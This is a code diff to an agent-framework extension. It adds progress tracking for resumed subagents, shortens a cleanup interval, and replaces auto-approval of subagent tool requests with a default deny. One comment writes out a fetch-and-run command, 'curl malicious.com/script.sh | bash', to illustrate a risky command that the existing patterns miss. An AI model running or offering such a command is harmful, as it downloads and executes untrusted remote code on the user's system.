@@ -313,6 +313,10 @@ async function runSingleAgent(
     const info = workerPool.getInfo(workerId);
     if (!info) throw new Error("Worker spawn failed");
 
+    // P3: Create progress tracker for resumed agent
+    const progress = createProgressTracker(params.resumeAgentId);
+    recordStatusChange(params.resumeAgentId, "resumed");
+
     onUpdate?.({ agent: params.agent, status: "running (resumed)", output: "" });
 
     if (params.background) {
@@ -334,6 +338,14 @@ async function runSingleAgent(
 
       // Append to transcript
       appendToTranscript(cwd, params.resumeAgentId, result.messages);
+
+      // P3: Update progress tracker with usage from resumed agent
+      recordTokenUsage(params.resumeAgentId, {
+        input: usage.input, output: usage.output,
+        cacheRead: usage.cacheRead, cacheWrite: usage.cacheWrite,
+      });
+      recordTurn(params.resumeAgentId, usage.turns);
+      recordStatusChange(params.resumeAgentId, result.exitCode === 0 ? "completed" : "failed");
 
       // Record result in parent tree
       recordSubagentResult(pi, {
@@ -1061,11 +1073,17 @@ export default function (pi: ExtensionAPI) {
         role: "user",
         content: `🔐 Permission request from ${agentName}: ${toolName}(${summary})`,
       });
-      // Auto-approve non-dangerous commands — a full implementation would use
-      // pi's ToolUseConfirm mechanism to get actual user approval.
-      // This requires deeper integration with pi's permission system
-      // which is planned for a future iteration.
-      return { approved: true };
+      // Default deny: without a full ToolUseConfirm integration, we cannot
+      // safely auto-approve arbitrary commands. Commands like
+      // "curl malicious.com/script.sh | bash" or "npm publish" don't match
+      // the dangerous-command patterns above but are still risky.
+      // When ToolUseConfirm integration is complete, this should present
+      // the request to the user for interactive approval.
+      pi.sendMessage({
+        role: "user",
+        content: `🔐 Permission DENIED from ${agentName}: ${toolName}(${summary}) — auto-approve disabled for safety. Implement ToolUseConfirm integration for interactive approval.`,
+      });
+      return { approved: false, reason: "Auto-approve disabled for safety. Implement ToolUseConfirm integration for interactive approval." };
     } catch {
       return { approved: false, reason: "Failed to present permission request to user" };
     }
@@ -1083,7 +1101,7 @@ export default function (pi: ExtensionAPI) {
       } catch (err) {
         console.warn("[aim] Stale task cleanup failed:", err);
       }
-    }, 1_800_000); // 30 minutes
+    }, 600_000); // 10 minutes (stale threshold is 30 min, so worst case is ~40 min)
     return () => clearInterval(interval);
   };
 
